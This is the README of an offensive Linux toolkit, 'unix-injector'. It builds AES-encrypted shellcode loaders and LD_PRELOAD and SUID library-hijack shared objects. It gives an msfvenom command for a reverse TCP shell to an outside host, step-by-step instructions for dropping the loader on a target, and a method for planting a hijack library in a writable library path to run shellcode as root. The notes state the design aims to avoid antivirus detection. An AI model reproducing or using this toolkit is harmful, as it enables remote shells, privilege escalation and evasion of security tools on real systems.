# unix-injector

Linux shellcode execution and shared library hijacking toolkit. All payloads are AES-128-ECB encrypted at build time with a random key — no plaintext strings in any artifact.

## Quick start

```bash
# Generate shellcode
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=443 -f raw -o shellcode.bin

# Build everything
make all

# Or just the loader (default target)
make
```

Drop `shellcode.bin`, run `make`, get artifacts in `dist/`.

## Artifacts

| Target | Artifact | Use case |
|--------|----------|----------|
| `make` | `dist/shellcode-runner` | Static ELF — drop on target, run it |
| `make hijack-lib` | `dist/hijack-lib.so` | Generic LD_PRELOAD hijack |
| `make hijack TARGET=<lib>` | `dist/<lib filename>` | Targeted library hijack with auto-generated symbol stubs |

## Usage

### Shellcode runner

```bash
# Transfer to target and execute
./shellcode-runner
```

Static binary, no dependencies. AES-decrypts the embedded shellcode at runtime, mmaps RWX, jumps to it.

### LD_PRELOAD hijack

```bash
LD_PRELOAD=./hijack-lib.so /path/to/target_binary
```

Constructor fires before `main()`, forks a child that runs the shellcode. Host process continues normally.

### Targeted library hijack

```bash
# On your box: find what the SUID binary loads
ldd /usr/bin/some_suid_binary

# Generate a hijack .so for a specific library
make hijack TARGET=/usr/lib/x86_64-linux-gnu/libwhatever.so.2

# On target: place in writable library search path
cp libwhatever.so.2 /writable/rpath/dir/
/usr/bin/some_suid_binary   # triggers the hijack
```

Reads exported symbols from the real `.so` via `readelf`, generates no-op function stubs (`return 0`) and dummy object stubs so the dynamic linker is satisfied. The constructor forks and runs shellcode with `setuid(0)/setgid(0)` for SUID scenarios.

## Build options

```bash
make SHELLCODE=payload.bin   # Use a different shellcode file (default: shellcode.bin)
make clean                   # Remove dist/
```

Each `make clean && make` generates a fresh random AES key.

## Project layout

```
├── Makefile
├── src/
│   ├── shellcode-runner.c      # Loader: AES decrypt → mmap RWX → execute
│   ├── aes.h                   # Hand-rolled AES-128-ECB decrypt (header-only, no crypto libs)
│   ├── aes-encoder.py          # Build-time AES encrypt with round-trip verification
│   ├── hijack-lib.c            # Generic LD_PRELOAD .so with AES shellcode constructor
│   └── gen-hijack-lib.py       # Generates targeted hijack .so from any shared library
└── dist/                       # Build artifacts (gitignored)
```

## Dependencies

Build host (Kali): `gcc`, `python3`, `readelf` (binutils) — all preinstalled.

Target: nothing. Shellcode runner is static. Hijack `.so` files link only against libc.

## Notes

- The AES implementation is hand-rolled (ported from [sharp-injector](../sharp-injector)'s `Encryptor.cs`) — no `libcrypto`/`libssl` imports for AV to flag
- Function stubs return 0/NULL — host process may behave oddly if it actually uses return values, but the shellcode has already forked by then
- ECB mode (no IV) — sufficient for signature evasion; the key is co-located in the binary anyway
